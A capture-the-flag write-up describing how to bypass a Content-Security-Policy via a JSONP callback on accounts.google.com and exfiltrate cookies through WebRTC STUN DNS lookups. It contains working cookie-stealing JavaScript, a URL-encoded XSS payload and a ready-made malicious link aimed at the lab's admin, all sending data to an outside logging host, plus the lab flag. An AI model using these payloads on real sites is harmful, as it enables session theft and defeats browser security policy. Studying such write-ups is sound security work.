Author's Note
@hossein
One way past a CSP is a JSONP endpoint on a host the policy already trusts. JSONP hands back JavaScript with your own text sitting inside it, and the browser loads it because the host is allowed. This policy trusts accounts.google.com, which still has one:

<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(origin)"></script>
Your callback comes back as callback({...}), so it has to be a call expression.

--------------------

# My note:

### Exfiltrating data under CSP — DNS via WebRTC

I had JavaScript execution on the page, but the Content-Security-Policy blocked every way out: `fetch()`/XHR die on `connect-src`, `new Image().src=...` dies on `img-src`. No HTTP load to my server was possible.

**The insight: CSP governs loads, not lookups.** The policy is enforced when the browser makes an HTTP request — it says nothing about *hostname resolution*. If I can make the browser resolve a hostname I choose, the data has already left: the DNS query itself is the exfil channel.

WebRTC hands you exactly that. To reach an ICE (STUN) server, the browser must first resolve its hostname:

```js
let f = document.cookie.match(/{(.+?)}/)?.[1]||'notfound';
let p = new RTCPeerConnection({iceServers:[{urls:"stun:"+f+".ux3s7632.requestrepo.com"}]});
p.createDataChannel("");
p.setLocalDescription();
```

The browser resolves `<cookie-value>.ux3s7632.requestrepo.com` — the data rides out as the leftmost label, and requestrepo logs the query. The STUN connection never even needs to succeed.

Two details that make it work:

- **`createDataChannel("")` + `setLocalDescription()`** — without a channel the offer has no ICE components and the STUN hostname may never be resolved. An empty data channel forces one; `setLocalDescription()` with no args (implicit offer) kicks off gathering.
- **Data must be a legal DNS label** — ≤63 chars, letters/digits/hyphen, case-insensitive. My value already was; otherwise encode it first (hex or Base32).

Result: seconds after the payload ran, the flag appeared in the requestrepo dashboard as the leftmost label of a DNS query. No CSP directive was ever touched — because none exists for DNS resolution.

### payload
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=(function()%7B%20%20let%20f%20%3D%20document.cookie.match(%2F%7B(.%2B%3F)%7D%2F)%3F.%5B1%5D%7C%7C'notfound'%3B%20%20let%20p%20%3Dnew%20RTCPeerConnection(%7BiceServers%3A%5B%7Burls%3A'stun%3A'%2Bf%2B'.ux3s7632.requestrepo.com'%7D%5D%7D)%3B%20%20p.createDataChannel('')%3B%20%20p.setLocalDescription()%3B%7D)"></script>
```

### link for admin
```
https://e358f9c2db73.pwnbox-lab.com/?guest=%3Cscript+src%3D%22https%3A%2F%2Faccounts.google.com%2Fo%2Foauth2%2Frevoke%3Fcallback%3D%28function%28%29%257B%2520%2520let%2520f%2520%253D%2520document.cookie.match%28%252F%257B%28.%252B%253F%29%257D%252F%29%253F.%255B1%255D%257C%257C%27notfound%27%253B%2520%2520let%2520p%2520%253Dnew%2520RTCPeerConnection%28%257BiceServers%253A%255B%257Burls%253A%27stun%253A%27%252Bf%252B%27.ux3s7632.requestrepo.com%27%257D%255D%257D%29%253B%2520%2520p.createDataChannel%28%27%27%29%253B%2520%2520p.setLocalDescription%28%29%253B%257D%29%22%3E%3C%2Fscript%3E
```

### flag
```
pwnbox{1a11e623958594b3771840de2ee48a49}
```
